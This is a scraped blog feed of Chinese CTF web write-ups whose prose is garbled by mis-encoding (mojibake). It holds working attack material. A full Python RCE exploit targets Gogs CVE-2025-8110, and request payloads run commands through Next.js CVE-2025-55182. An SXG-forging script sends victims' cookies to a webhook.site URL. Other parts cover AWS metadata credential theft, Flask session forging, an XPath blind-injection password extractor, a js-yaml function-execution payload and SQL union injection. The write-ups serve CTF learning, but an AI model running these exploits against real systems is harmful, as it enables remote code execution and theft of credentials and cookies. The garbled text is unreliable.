è¿™é¢˜ç›®è€ƒçš„æ˜¯æ ¹æ®ssh2æ¨¡å—çš„å®šä¹‰ï¼Œå…¶ä¸­æœ‰ä¸€ä¸ªssh2.exec://åè®®æ”¯æŒè¿œç¨‹æ‰§è¡Œå‘½ä»¤ ä¸è¿‡éœ€è¦æœ‰æ•ˆçš„å‡­è¯ æ ¼å¼ssh2.exec://user:pass@ip/cmd ä¸èƒ½ç”¨adminadmin888 æˆ‘ä¼°è®¡æ˜¯æƒé™ä¸å¤Ÿ ä½†æ˜¯æˆ‘ä»¬è¿˜æœ‰ä¸€ç»„å‡­è¯ ctfer å¯†ç ä½¿ç”¨hashcatå»çˆ†ç ´è¯•è¯•çœ‹ hashcat -m 0 58d506617a1e20a9d87ab5a3debcb151 /usr/share/wordlists/rockyou.txt å¾ˆå¿«å°±çˆ†ç ´å‡ºæ¥58d506617a1e20a9d87ab5a3debcb151:duhgrl ssh2.exec://ctfer:duhgrl@127.0.0.1/cat/flag /var/www/html/1.txt; CloudDiagè¿™é“é¢˜éšä¾¿æ³¨å†Œä¸ªå· å‘ç°æœ‰session ä¹ æƒ¯æ‹¿å»flask-unsignçˆ†ç ´ä¸‹ D:\\ctf\\WEB\\Flask-Unsign-masterflask-unsign --unsign --cookie eyJib290X2lkIjoiMTc3MDQ2NDkyNy41ODc1MzMiLCJ1c2VyX2lkIjoyfQ.aYcmrQ.4caopIOKvAt8yT2PeagcEofVmBk --wordlist pass.txt --no-literal-eval[*] Session decodes to: boot_id: 1770464927.587533, user_id: 2[*] Starting brute-forcer with 8 threads..[+] Found secret key after 80768 attemptser-secret-tobdev-secret æˆåŠŸæ‰¾åˆ°secret ä¼ªé€ adminçš„session D:\\ctf\\WEB\\Flask-Unsign-masterflask-unsign --sign --cookie boot_id: 1770464927.587533, user_id: 1 --secret dev-secreteyJib290X2lkIjoiMTc3MDQ2NDkyNy41ODc1MzMiLCJ1c2VyX2lkIjoxfQ.aYcomA.Z9yHOm2dv4WWYirH4AsfDoYy5tc çœ‹åˆ°æˆåŠŸä½œä¸ºrootç™»å½• rootå¯ä»¥çœ‹åˆ°æ‰€æœ‰åˆ›é€ çš„task æˆ‘ä»¬çœ‹åˆ°æœ‰ä¸€ä¸ªå†å²è®°å½• http://metadata:1338/latest/meta-data/iam/security-credentials/ å¯ä»¥é€šè¿‡è¿™ä¸ªè·¯ç”±æ‹¿åˆ°awsçš„è®¤è¯æ‰€éœ€è¦çš„ä¸œè¥¿ AccessKeyId: AKIA3592B2052AC94DDA, Code: Success, Expiration: 2026-02-07T12:15:56.566862Z, SecretAccessKey: 4787b9bf4fac4523a535ab41f4b2817ba1dbdfa217104b5d9cf1d7c380ce98b3, Token: 20cac091fcd843499b6746d65f1c81a3b2ba3219adf141aebd10d53241b58c68, Type: AWS-HMAC æˆ‘ä»¬åŠ ä¸Šæœ‰ä¸€ä¸ªCloud Explorerçš„åŠŸèƒ½ è¾“å…¥Access Key ID Secret Access Key Session Tokenæ‹¿åˆ°äº† clouddiag-publicclouddiag-reportsclouddiag-secrets è¿™ä¸‰ä¸ªBucket è‚¯å®šçœ‹clouddiag-secrets flags/runtime/flag-19323baa03f7489d89230536696b7327.txt (54 bytes)notes/rotation.txt (77 bytes) å†æŠŠè¿™ä¸ªflagsruntimeflag-19323baa03f7489d89230536696b7327.txtå¡«åœ¨Object Key (optional)å³å¯æ‹¿åˆ°flag gogogosæŒ‡çº¹è¯†åˆ«å°±æ˜¯çŸ¥é“è€ƒçš„æ˜¯CVE-2025-8110 å‚è€ƒæ–‡ç« CVE-2025-8110 Gogsè¿œç¨‹å‘½ä»¤æ³¨å…¥æ¼æ´ç»•è¿‡åˆ†æä¸å¤ç°-å…ˆçŸ¥ç¤¾åŒº è¿™ä¸ªé¢˜ç›®å°±æ˜¯å¤ç°cve æˆ‘æ˜¯è‡ªå·±æ‰‹åŠ¨åšçš„ è´´ä¸€ä¸ªå®˜æ–¹wpçš„è„šæœ¬å§ import requestsimport osimport subprocessimport shutilimport base64import sysimport timeimport argparse# ConfigurationTARGET_BASE_URL = http://localhost:3000 # ç›®æ ‡Gogs, éœ€è¦å¼€æ”¾æ³¨å†ŒåŠŸèƒ½æˆ–å·²å­˜åœ¨å¯ç™»å½•ç”¨æˆ·USERNAME = aaa # ç™»å½•ç”¨æˆ·åPASSWORD = 111111 # ç™»å½•å¯†ç REPO_OWNER = aaa # ä»“åº“æ‰€æœ‰è€…REPO_NAME = bbb # ä»“åº“åç§°SYMLINK_FILENAME = test # è¦åˆ›å»ºçš„symlinkæ–‡ä»¶åTARGET_FILE = .git/config # symlinkæŒ‡å‘çš„ç›®æ ‡æ–‡ä»¶ï¼Œè¿™é‡Œæ˜¯gité…ç½®æ–‡ä»¶# Derived constantsREPO_URL = fTARGET_BASE_URL/REPO_OWNER/REPO_NAME.gitAPI_URL = fTARGET_BASE_URL/api/v1/repos/REPO_OWNER/REPO_NAME/contents/SYMLINK_FILENAMEimport statdef on_rm_error(func, path, exc_info): # path contains the path of the file that couldnt be removed # lets just assume its read-only and try to make it writable. os.chmod(path, stat.S_IWRITE) try: func(path) except Exception: passdef setup_git_repo(): print(f[*] Setting up local git repository to push symlink SYMLINK_FILENAME - TARGET_FILE...) if os.path.exists(temp_exploit_repo): try: shutil.rmtree(temp_exploit_repo, onerror=on_rm_error) except Exception as e: print(f[!] Warning: Could not clean up old repo: e) if not os.path.exists(temp_exploit_repo): os.makedirs(temp_exploit_repo) os.chdir(temp_exploit_repo) try: subprocess.run([git, init], check=True) # Create a dummy file to commit first (optional, but good practice) with open(README.md, w) as f: f.write(# POC Repo) subprocess.run([git, add, README.md], check=True) subprocess.run([git, commit, -m, Initial commit], check=True) # Create the symlink using git hash-object # We want SYMLINK_FILENAME to point to TARGET_FILE print([*] Creating symlink manually via git objects...) # 1. Get hash of the target path string # Note: echo -n is important to avoid newline proc = subprocess.run([git, hash-object, -w, --stdin], input=TARGET_FILE.encode(), stdout=subprocess.PIPE, check=True) blob_hash = proc.stdout.decode().strip() # 2. Add to index as symlink (mode 120000) subprocess.run([git, update-index, --add, --cacheinfo, 120000, blob_hash, SYMLINK_FILENAME], check=True) # Verify the mode in the index proc_ls = subprocess.run([git, ls-files, -s, SYMLINK_FILENAME], stdout=subprocess.PIPE, check=True) print(f[*] Verified git index mode: proc_ls.stdout.decode().strip()) # 3. Commit subprocess.run([git, commit, -m, Add malicious symlink], check=True) # 4. Push to remote # Construct URL with credentials # Handle protocol (http/https) protocol = REPO_URL.split(://)[0] rest = REPO_URL.split(://)[1] auth_repo_url = fprotocol://USERNAME:PASSWORD@rest print(f[*] Pushing to REPO_URL...) subprocess.run([git, remote, add, origin, auth_repo_url], check=True) subprocess.run([git, push, -u, origin, master, -f], check=True) print([+] Symlink pushed successfully.) except subprocess.CalledProcessError as e: print(f[-] Git operation failed: e) sys.exit(1) finally: os.chdir(..)def trigger_rce(rce_command, proxies=None): print(f[*] Triggering RCE by overwriting SYMLINK_FILENAME via API...) print(f[*] Command to execute: rce_command) # Construct malicious git config # We include standard core settings to avoid breaking git immediately # The fsmonitor is the key payload config_payload = f[core] repositoryformatversion = 0 filemode = true bare = false logallrefupdates = true ignorecase = true precomposeunicode = true fsmonitor = rce_command[remote origin] url = REPO_URL fetch = +refs/heads/*:refs/remotes/origin/* # Base64 encode the content content_b64 = base64.b64encode(config_payload.encode()).decode() payload = content: content_b64, message: Trigger RCE, branch: master headers = Content-Type: application/json, Authorization: ftoken get_token() if False else None # We use Basic Auth # Try to create a token first if Basic Auth fails or just use it token = create_token(proxies) if token: print(f[+] Obtained token: token) headers[Authorization] = ftoken token auth = None # Do not use basic auth if we have token else: print([!] Could not create token, falling back to Basic Auth (which failed previously with 401)) auth = (USERNAME, PASSWORD) print(f[*] Sending PUT request to API_URL) try: response = requests.put(API_URL, json=payload, auth=auth, headers=headers, proxies=proxies) print(f[*] Response Status Code: response.status_code) print(f[*] Response Body: response.text) if response.status_code == 500: print([+] Received 500 Internal Server Error. This is EXPECTED if the exploit worked!) print( The fsmonitor command is executed when Gogs tries to run git add internally.) print(f Check if the command rce_command was executed on the server.) elif response.status_code == 200 or response.status_code == 201: print([-] Received 200/201. The file was updated. Check if RCE triggered.) else: print([-] Unexpected response status.) except Exception as e: print(f[-] Request failed: e)def create_token(proxies=None): print([*] Attempting to create an access token via API...) url = fTARGET_BASE_URL/api/v1/users/USERNAME/tokens auth = (USERNAME, PASSWORD) payload = name: fexploit_token_int(time.time()) try: response = requests.post(url, json=payload, auth=auth, proxies=proxies) if response.status_code == 201: return response.json().get(sha1) else: print(f[-] Failed to create token. Status: response.status_code, Body: response.text) return None except Exception as e: print(f[-] Token creation request failed: e) return Noneif __name__ == __main__: parser = argparse.ArgumentParser(description=Gogs CVE-2025-8110 RCE Exploit) parser.add_argument(--command, default=touch /tmp/GOGS_RCE_SUCCESS_CVE_2025_8110, help=Command to execute on the server) parser.add_argument(--skip-setup, action=store_true, help=Skip git repo setup (use if already pushed)) parser.add_argument(--proxy, default=None, help=Proxy URL (default: None)) args = parser.parse_args() proxies = None if args.proxy: proxies = http: args.proxy, https: args.proxy print(f[*] Using proxy: args.proxy) if not args.skip_setup: setup_git_repo() # Wait a moment to ensure consistency time.sleep(2) rce_command = args.command # Escape double quotes for git config rce_command = rce_command.replace(, \\\\) # For verification: Print the exact command being injected print(f[*] Injected fsmonitor command: rce_command) trigger_rce(rce_command, proxies=proxies)","tags":["CTF-wp"]},{"title":"æ–½å·¥ing-next.jsä¹‹CVE-2025-55182ä»£ç å®¡è®¡","path":"/2026/02/04/next.jsä»£ç å®¡è®¡/","content":"è¿™æ´æœ€è¿‘ç»å¸¸å‡ºç°åœ¨ctfè€ƒé¢˜ï¼Œä¼šåœ¨æ¼æ´çš„åŸºç¡€ä¸Šåšwafï¼Œå¯’å‡å¾ˆå¤šæ¯”èµ›éƒ½é‡åˆ°äº†ï¼Œåˆšå¥½æƒ³é”»ç‚¼è‡ªå·±å®¡è®¡ä»£ç çš„èƒ½åŠ›ï¼Œäºæ˜¯å°±æ‰“ç®—å†™ä¸€ä¸ªè¿™è¿™ä¸ªæ´çš„å®¡è®¡æ•™ç¨‹~ æ¼æ´ä»‹ç»https://react.dev/blog/2025/12/03/critical-security-vulnerability-in-react-server-componentshttps://react2shell.com/https://nvd.nist.gov/vuln/detail/CVE-2025-55182 å½±å“ç‰ˆæœ¬Next.js 15.x 15.0.5Next.js 16.x 16.0.7React Server Components 19.0.0ã€19.1.0ã€19.1.1 19.2.0 ç‰ˆæœ¬å­˜åœ¨é¢„èº«ä»½éªŒè¯è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´è½¯ä»¶åŒ…ï¼šreact-server-dom-parcelã€react-server-dom-turbopack å’Œ react-server-dom-webpackã€‚ å¤ç°ç¯å¢ƒé…ç½®æœ‰node.jså°±è¡Œ npm init -ynpm create next-app@16.0.5 react -ycd reactnpm run dev å‡ºç°è¿™ä¸ªç•Œé¢å°±æ˜¯å®‰è£…æˆåŠŸäº† æ¼æ´å¤ç°poc1å’Œpoc2å…¶å®æ²¡ä»€ä¹ˆåŒºåˆ« åˆ†åˆ«ç”¨çš„execSyncå’ŒspawnSync poc-1 POST / HTTP/1.1Host: 127.0.0.1:3000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15Accept-Encoding: gzip, deflate, brAccept: */*Connection: keep-aliveNext-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0Content-Length: 691Content-Type: multipart/form-data; boundary=23b6c1590a28ba5570b0915d528827c4--23b6c1590a28ba5570b0915d528827c4Content-Disposition: form-data; name=0then:$1:__proto__:then,status:resolved_model,reason:-1,value:\\then\\:\\$B1337\\,_response:_prefix:var res=encodeURIComponent(process.mainModule.require(child_process).execSync(whoami).toString().trim());;throw Object.assign(new Error(NEXT_REDIRECT),digest: `NEXT_REDIRECT;push;/login?a=$res;307;`);,_chunks:$Q2,_formData:get:$1:constructor:constructor--23b6c1590a28ba5570b0915d528827c4Content-Disposition: form-data; name=1$@0--23b6c1590a28ba5570b0915d528827c4Content-Disposition: form-data; name=2[]--23b6c1590a28ba5570b0915d528827c4-- poc-2 POST / HTTP/1.1Host: 127.0.0.1:3000User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15Accept-Encoding: gzip, deflate, brAccept: */*Connection: keep-aliveNext-Action: 409defd89dd31eeb200d9ea02b1f325d25f5f5f3f0Content-Length: 719Content-Type: multipart/form-data; boundary=c08d154aee2e180c61d30ba1cebce34f--c08d154aee2e180c61d30ba1cebce34fContent-Disposition: form-data; name=0then:$1:__proto__:then,status:resolved_model,reason:-1,value:\\then\\:\\$B1337\\,_response:_prefix:var r=process.mainModule.require(child_process).spawnSync(whoami,encoding:utf8,timeout:5000);var res=r.stdout||r.stderr||;throw Object.assign(new Error(NEXT_REDIRECT),digest:`NEXT_REDIRECT;push;/login?a=$res.trim();307;`);,_chunks:$Q2,_formData:get:$1:constructor:constructor--c08d154aee2e180c61d30ba1cebce34fContent-Disposition: form-data; name=1$@0--c08d154aee2e180c61d30ba1cebce34fContent-Disposition: form-data; name=2[]--c08d154aee2e180c61d30ba1cebce34f-- å‘½ä»¤å›æ˜¾å‡å¯åœ¨å›æ˜¾å¤´é‡Œçœ‹åˆ°","tags":["ä»£ç å®¡è®¡"]},{"title":"SECCON CTF 14 Quals-broken-challenge","path":"/2025/12/18/SECCON CTF 14 Quals-å¤ç°/","content":"broken-challengeè‡ªå·±çœ‹äº†åšä¸å‡ºæ¥ï¼Œå€Ÿé‰´å¤§ä½¬çš„wpå­¦ä¹ äº†ã€‚ è€ƒç‚¹:sxgçªƒå–cookie SXGæœºåˆ¶SXG å…¨åæ˜¯Signed Exchangeï¼Œæ˜¯ä¸€ç§ è®©å†…å®¹å¯ä»¥è¢«å®‰å…¨åœ°â€œè½¬è½½â€æˆ–â€œé¢„åŠ è½½â€çš„æŠ€æœ¯ã€‚ SXG ä½¿ç”¨ç¼“å­˜æ¥é¢„æå–å’Œä¼ é€å·²ç”±æ¥æºè¿›è¡ŒåŠ å¯†ç­¾åçš„å†…å®¹ã€‚è¿™æœ‰åŠ©äºåŠ å¿«ä»å¼•èæ¥æºç½‘ç«™è¿›è¡Œè·¨æºå¯¼èˆªçš„é€Ÿåº¦ï¼ŒåŒæ—¶ç¡®ä¿ç½‘é¡µä¿æŒä¸å˜ï¼Œå¹¶æ­£ç¡®å½’å› äºå…¶æ¥æºã€‚ SXG æ–‡ä»¶å°è£…åœ¨äºŒè¿›åˆ¶ç¼–ç æ–‡ä»¶ä¸­ï¼Œè¯¥æ–‡ä»¶åŒ…å«ä¸¤ä¸ªä¸»è¦ç»„ä»¶ï¼šHTTP äº¤æ¢å’Œæ¶µç›–è¯¥äº¤æ¢çš„ç­¾åã€‚HTTP äº¤æ¢ç”±è¯·æ±‚ç½‘å€ã€å†…å®¹åå•†ä¿¡æ¯å’Œ HTTP å“åº”ç»„æˆã€‚è§£ç åçš„SXGé•¿ä¸‹é¢è¿™æ ·ï¼š format version: 1b3request: method: GET uri: https://example.org/ headers:response: status: 200 headers: Cache-Control: max-age=604800 Digest: mi-sha256-03=kcwVP6aOwYmA/j9JbUU0GbuiZdnjaBVB/1ag6miNUMY= Expires: Mon, 24 Aug 2020 16:08:24 GMT Content-Type: text/html; charset=UTF-8 Content-Encoding: mi-sha256-03 Date: Mon, 17 Aug 2020 16:08:24 GMT Vary: Accept-Encodingsignature: label;cert-sha256=emViFgi0WfQ+NotPJf8PBo2T5dEuZ13NdZefPybXq/HhE=/em; cert-url=quot;https://test.web.app/ViFgi0WfQ-NotPJf8PBo2T5dEuZ13NdZefPybXq_HhEquot;; date=1597680503;expires=1598285303;integrity=quot;digest/mi-sha256-03quot;;sig=emMEUCIQD5VqojZ1ujXXQaBt1CPKgJxuJTvFlIGLgkyNkC6d7LdAIgQUQ8lC4eaoxBjcVNKLrbS9kRMoCHKG67MweqNXy6wJg=/em; validity-url=quot;https://example.org/webpkg/validityquot;header integrity: sha256-Gl9bFHnNvHppKsv+bFEZwlYbbJ4vyf4MnaMMvTitTGQ=/ppThe exchange has a valid signature.payload [1256 bytes]:/ppre class=prettyprintcodelt;titlegt;SXG examplelt;/titlegt;lt;meta charset=#34;utf-8#34;gt;lt;meta http-equiv=#34;Content-type#34; content=#34;text/html; charset=utf-8#34;gt;lt;style type=#34;text/css#34;gt;body background-color: #f0f0f2; margin: 0; padding: 0;lt;/stylegt;/code/prediv h1Hello/h1/divp å·¥ä½œæµç¨‹ å‘å¸ƒè€…ï¼ˆå¦‚ example.comï¼‰ç”Ÿæˆä¸€ä¸ªç‰¹æ®Šæ ¼å¼çš„ .sxg æ–‡ä»¶ã€‚è¿™ä¸ªæ–‡ä»¶é‡ŒåŒ…å«äº†ï¼šå®Œæ•´çš„ç½‘é¡µå†…å®¹ï¼ˆHTMLã€CSSã€JS ç­‰ï¼‰ã€‚ä¸€ä¸ªæ•°å­—ç­¾åï¼ˆè¿™å°±æ˜¯â€œSXGç­¾åâ€ï¼‰ï¼Œç”¨äºè¯æ˜è¿™ä¸ªå†…å®¹ç¡®å®æ¥è‡ª example.comï¼Œä¸”åœ¨ç­¾ååæ²¡æœ‰è¢«ç¯¡æ”¹ã€‚ç­¾åçš„æœ‰æ•ˆæœŸï¼ˆä¾‹å¦‚ 7 å¤©ï¼‰ã€‚åˆ†å‘è€…ï¼ˆå¦‚ Googleï¼‰è·å–è¿™ä¸ª .sxg æ–‡ä»¶ï¼Œå¹¶å­˜å‚¨åœ¨è‡ªå·±çš„ CDN ä¸Šã€‚ç”¨æˆ·ç‚¹å‡»æœç´¢ç»“æœæ—¶ï¼Œæµè§ˆå™¨ä» Google çš„ CDN å¿«é€ŸåŠ è½½ .sxg æ–‡ä»¶ã€‚æµè§ˆå™¨æ”¶åˆ°æ–‡ä»¶åï¼šéªŒè¯ç­¾åæ˜¯å¦æœ‰æ•ˆï¼ˆç¡®ä¿è¯ä¹¦åˆæ³•ã€å†…å®¹æœªç¯¡æ”¹ï¼‰ã€‚éªŒè¯ç­¾åä¸­çš„ç½‘å€æ˜¯å¦ä¸å†…å®¹å£°ç§°çš„æ¥æºä¸€è‡´ã€‚å¦‚æœå…¨éƒ¨é€šè¿‡ï¼Œæµè§ˆå™¨å°±ä¼šåƒç›´æ¥ä» example.com åŠ è½½ä¸€æ ·æ¸²æŸ“é¡µé¢ï¼Œå¹¶åœ¨åœ°å€æ æ˜¾ç¤º https://example.com/articleã€‚ æˆ‘ä¸ªäººæŠŠè¿™ä¸ªsxgæ–‡ä»¶ç†è§£ä¸ºä¸€ç§â€ç¼“å­˜æ–‡ä»¶â€ï¼Œæµè§ˆå™¨é€šè¿‡åŠ è½½è¿™ä¸ªsxgæ–‡ä»¶ï¼Œå¯ä»¥å¢å¿«åŠ è½½é€Ÿåº¦ï¼Œè¿™æ ·æå‡é€Ÿåº¦ã€‚ å›åˆ°é¢˜ç›®é¢˜ç›®æºç index.jså®šä¹‰äº†ä¸€ä¸ªbotè·¯ç”± hintè·¯ç”±ä¼šæŠŠcert.keyå›æ˜¾ç»™æˆ‘ä»¬ æŸ¥çœ‹conf.js è¿™é‡Œå®šä¹‰äº†flagåœ¨cookieé‡Œ è¿™é‡Œæœ‰ä¸€ä¸ªå…³é”®ç‚¹å°±æ˜¯åªæœ‰å½“æˆ‘ä»¬çš„domainæ˜¯hack.the.planet.secconæ—¶å€™ æ‰ä¼šæŠŠcookieè®¾ç½®ä¸ºæˆ‘ä»¬çš„flagã€‚ é‚£ä¹ˆåŸŸåæ¥è‡ªäºhack.the.planet.secconï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±éœ€è¦ä¼ªé€ sxgæ–‡ä»¶æ¥è¾¾åˆ°è¿™ä¸ªç›®çš„ä»è€Œæ‹¿åˆ°flag ä¼ªé€ sxgæ–‡ä»¶éœ€è¦cert.keyå’Œcert.crt å†™ä¸€ä¸ª1.shæ–‡ä»¶ ./1.sh https://your_ip:8080/ #!/bin/shURL=$1rm -rf server.key cert.csr cert.pem cert.cbor cert.oscp index.txt exploit.sxgopenssl ecparam -name prime256v1 -genkey -out server.keyopenssl req -new -sha256 -key server.key -out cert.csr \\ -subj /CN=hack.the.planet.secconopenssl x509 -req -days 90 -in cert.csr \\ -CA cert.crt -CAkey cert.key -CAcreateserial \\ -out cert.pem \\ -extfile (echo -e 1.3.6.1.4.1.11129.2.1.22 = ASN1:NULL subjectAltName=DNS:hack.the.planet.seccon)SERIAL=$(openssl x509 -in cert.pem -serial -noout | cut -d= -f2)echo -e V\\t301231235959Z\\t\\t$SERIAL\\tunknown\\t/CN=hack.the.planet.seccon index.txtopenssl ocsp -index index.txt \\ -rsigner cert.crt -rkey cert.key \\ -CA cert.crt \\ -issuer cert.crt \\ -serial 0x$SERIAL \\ -respout cert.ocsp \\ -ndays 7gen-certurl -pem cert.pem -ocsp cert.ocsp cert.cborgen-signedexchange \\ -uri https://hack.the.planet.seccon/index.html \\ -content index.html \\ -certificate cert.pem \\ -privateKey server.key \\ -certUrl $URL/cert.cbor \\ -validityUrl https://hack.the.planet.seccon/validity \\ -o exploit.sxg index.html html body script window.location = https://webhook.site/8a43c6eb-66fb-46d1-9101-20fb28129c85?cookie= + encodeURIComponent(document.cookie); /script /body/html èµ·æœåŠ¡è¿™æ ·å†™ package mainimport ( log net/http path/filepath strings)func main() fs := http.FileServer(http.Dir(.)) http.HandleFunc(/, func(w http.ResponseWriter, r *http.Request) ext := strings.ToLower(filepath.Ext(r.URL.Path)) switch ext case .sxg: w.Header().Set(Content-Type, application/signed-exchange;v=b3) case .cbor: w.Header().Set(Content-Type, application/cert-chain+cbor) w.Header().Set(X-Content-Type-Options, nosniff) w.Header().Set(Cache-Control, no-store) fs.ServeHTTP(w, r) ) log.Println(Serving on :8080) if err := http.ListenAndServe(:8080, nil); err != nil log.Fatal(err) boté‚£å†™ https://your_ip:8080/expolit.sxg webhookæ¥æ”¶åˆ° cookieå³å¯çœ‹åˆ°flag è¿˜éœ€è¦æ³¨æ„çš„ç‚¹å°±æ˜¯ httpsæ‰èƒ½åŠ è½½sxg","tags":["CTF-wp"]},{"title":"BackdoorCTF2025ä¹‹Trust Issues","path":"/2025/12/08/xpath-æ³¨å…¥/","content":"å‰è¨€å› ä¸ºå›½é™…èµ›ç¢°åˆ°äº†ä¸€ä¸ªæ²¡è§åˆ°è¿‡çš„æ³¨å…¥â€“xpath äºæ˜¯è®°å½•ä¸€ä¸‹åšé¢˜è¿‡ç¨‹ èµ›é¢˜é¦–å…ˆæ‹¿åˆ°å°±æ˜¯æœ‰æºç ï¼Œç½‘ç«™å°±æ˜¯ä¸€ä¸ªç™»å½•æ³¨å†Œç‚¹ åˆ†adminå’Œéadminç”¨æˆ· æœ‰ä¸€ä¸ªadminçš„é¢æ¿ adminé¢æ¿è¿›å»å¯ä»¥å¹²ä¸€äº›æ“ä½œ åæ­£æˆ‘ä»¬è¦å…ˆå˜æˆadminç”¨æˆ· å®¡è®¡æºç  åœ¨loginå¤„å­˜åœ¨æ˜æ˜¾çš„æ³¨å…¥ å¹¶ä¸”å½“usernodeå¸ƒå°”å€¼ä¸º1çš„æ—¶å€™ ä¼šå»¶è¿Ÿä¸¤ç§’ ç¬¦åˆxpathå¸ƒå°”ç›²æ³¨çš„æ¡ä»¶ æµ‹è¯• or 1=1 #è¿”å›çœŸ å»¶è¿Ÿä¸¤ç§’ or 1=2 #è¿”å›å‡ ä¸å»¶è¿Ÿ ç¡®å®å¦‚æˆ‘ä»¬é¢„æ–™ä¸€èˆ¬å­˜åœ¨å¸ƒå°”ç›²æ³¨ è¿™æ ·æˆ‘ä»¬å¯ä»¥å¾—åˆ°adminçš„password xpathæ˜¯æ²¡æœ‰æ³¨é‡Šç¬¦å· é€šè¿‡æ„é€ é—­åˆæ¥ äºæ˜¯æœ‰è„šæœ¬ import requestsimport timedef quick_extract_admin(): url = http://104.198.24.52:6014/login print(get pasword...) def test(payload): start = time.time() try: requests.post(url, data=username: payload, password: anything, timeout=3) except: return False return time.time() - start 2.0 #åˆ¤æ–­passwordé•¿åº¦ for length in range(1, 30): payload = f or (username/text()=admin and string-length(password)=length) or 1=2 if test(payload): print(fpassword-length: length) break password = simple_charset = abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 #ç›²æ³¨å¯†ç  for pos in range(1, length + 1): for char in simple_charset: payload = f or (username/text()=admin and substring(password,pos,1)=char) or 1=2 if test(payload): password += char print(fpostion pos: char) break else: password += _ print(fpostion pos: unkown) print(f password: password) return passwordquick_extract_admin() é¶æœºæœ‰äº›ä¸ç¨³å®š å¤šçˆ†å‡ æ¬¡ adminå¯†ç æ˜¯df08cf è¿›å»åæ˜¯ä¸€ä¸ªæ·»åŠ æ–‡ä»¶çš„åŠŸèƒ½ è¿™é‡Œå­˜åœ¨cve æœ¬åœ°npmå°±å¯ä»¥çœ‹åˆ° æ¼æ´ç‚¹åœ¨yam.load() æˆ‘ä»¬å¯ä»¥é€šè¿‡æ„é€ æ¶æ„yamlæ¥RCE !!js/function function()return process.mainModule.require(child_process).execSync(cat flag.txt).toString();() xpathæ³¨å…¥å¯ä»¥å‚è€ƒhttps://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/#%E5%B8%B8%E8%A7%84%E6%B3%A8%E5%85%A5çš„åšå®¢","tags":["CTF-wp"]},{"title":"HeroCTF v7-web","path":"/2025/12/04/HeroCTF v7-WEB/","content":"HeroCTF v7-WEBRevokedè¿›å»å°±æ˜¯æ³¨å†Œç™»å½•ç™»å‡ºè·¯ç”± çœ‹æºç  ä¸»è¦æ˜¯ä¸‹é¢è¿™å‡ ä¸ªè·¯ç”± @app.route(/employees, methods=[GET])@token_requireddef employees(): query = request.args.get(query, ) conn = get_db_connection() cursor = conn.cursor() cursor.execute( fSELECT id, name, email, position FROM employees WHERE name LIKE %query% ) results = cursor.fetchall() conn.close() print(request.username) return render_template(employees.html, username=request.username, employees=results, query=query)@app.route(/admin, methods=[GET])@token_requireddef admin(): is_admin = getattr(request, is_admin, None) if is_admin: return render_template(admin.html, username=request.username, flag=FLAG) flash(You dont have the permission to access this area, error) return redirect(/employees) åœ¨employeeå­˜åœ¨sqlæ³¨å…¥ unionè”åˆæ³¨å…¥ çœ‹æºç å¯ä»¥çŸ¥é“æ•°æ®åº“çš„ç»“æ„ def init_db(): conn = sqlite3.connect(database.db) cursor = conn.cursor() cursor.execute(DROP TABLE IF EXISTS employees;) cursor.execute(DROP TABLE IF EXISTS revoked_tokens;) cursor.execute(DROP TABLE IF EXISTS users;) cursor.execute(CREATE TABLE IF NOT EXISTS users ( id INTEGER PRIMARY KEY AUTOINCREMENT, username TEXT UNIQUE NOT NULL, is_admin BOOL NOT NULL, password_hash TEXT NOT NULL)) cursor.execute(CREATE TABLE IF NOT EXISTS revoked_tokens ( id INTEGER PRIMARY KEY AUTOINCREMENT, token TEXT NOT NULL)) cursor.execute(CREATE TABLE IF NOT EXISTS employees ( id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT NOT NULL, email TEXT UNIQUE NOT NULL, position TEXT NOT NULL, phone TEXT NOT NULL, location TEXT NOT NULL)) conn.commit() conn.close() æ‰€ä»¥æˆ‘ä»¬sqlæ³¨å…¥çš„è¯­å¥å†™æˆ 1â€™ union select 1,id,3,username from usersâ€“+ è¿™æ ·å°±å¯ä»¥æŸ¥è¯¢åˆ°æˆ‘ä»¬æ•æ„Ÿä¿¡æ¯ æ¯”å¦‚adminçš„password_hash æˆ‘ä»¬è¦æ‹¿åˆ°flagå°±éœ€è¦ä»¥adminçš„èº«ä»½è®¿é—®admin é‚£ä¹ˆè¿™é‡Œæœ‰ä¸¤ç§åšæ³• å®˜æ–¹ç»™çš„åšæ³• æ˜¯ä½¿ç”¨å·²çŸ¥hashçˆ†ç ´æ˜æ–‡å¯†ç ç”¨rockyou (?) è¿™é“é¢˜å…¶å®è¿˜æœ‰ä¸¤ç§è§£æ³• æˆ‘æ”¾åœ¨revengeä¸€èµ·å†™ Revoked Revenge1â€™ union select 1,id,3,token from revoked_tokensâ€“+ å¯ä»¥çœ‹åˆ°è¢«æ’¤é”€çš„token æƒ³åŠæ³•è®©è¿™ä¸ªtokenæœ‰æ•ˆ solution1ä¿®æ”¹ Base64 çš„æ–‡æœ¬è¡¨ç¤ºå½¢å¼ï¼Œç‰¹åˆ«æ˜¯é‚£äº›ä¸åŒ…å«æœ‰æ•ˆæ•°æ®çš„éƒ¨åˆ†ï¼Œä¸ä¼šè®©æˆ‘ä»¬çš„tokenå¤±æ•ˆå¹¶ä¸”æˆ‘ä»¬è¿˜å¯ä»¥é€šè¿‡adminçš„éªŒè¯ åŸç†å‚è€ƒæ–‡ç« : https://security.stackexchange.com/questions/272746/jwt-able-to-change-signature-and-its-still-verified https://github.com/jwtk/jjwt/#base64-changing-characters 1. ç­¾åéªŒè¯åªå…³å¿ƒå­—èŠ‚æ•°ç»„åŠ å¯†æ“ä½œï¼ˆå¦‚ç­¾åéªŒè¯ï¼‰å§‹ç»ˆåœ¨åŸå§‹äºŒè¿›åˆ¶æ•°æ®ï¼ˆå­—èŠ‚æ•°ç»„ï¼‰ä¸Šæ‰§è¡Œã€‚Base64 åªæ˜¯ä¸€ç§å°†è¯¥å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºæ–‡æœ¬æ 